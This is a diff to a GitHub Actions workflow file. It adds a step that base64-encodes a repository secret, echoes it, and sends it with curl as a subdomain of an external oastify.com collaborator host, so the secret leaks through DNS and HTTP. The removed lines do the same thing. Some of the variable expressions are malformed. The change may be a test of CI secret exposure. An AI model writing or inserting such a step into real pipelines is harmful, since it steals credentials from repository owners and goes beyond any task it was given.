@@ -23,14 +23,6 @@ jobs:
     steps:
       - name: Run a one-line script
         run: |
-          echo "EXFIL=${{ secrets.A_SECRET }}" | base64 >> $GITHUB_ENV
-
-
-
-
-      - name: Exfil
-        env:
-        EXFILED:  ${{ env.EXFIL }}
-        run: |
-          echo ${EXFILED}
-          curl -v http://${ EXFILED }}.ra59rmdtjx3wh3khhtnu5cimxd34rwfl.oastify.com
+          echo "EXFIL=${{ secrets.A_SECRET }}" | base64 >> $GITHUB_OUTPUT
+          echo ${steps.outputs.EXFIL}
+          curl -v http://${{ needs.outputs.EXFIL  }}.ra59rmdtjx3wh3khhtnu5cimxd34rwfl.oastify.com
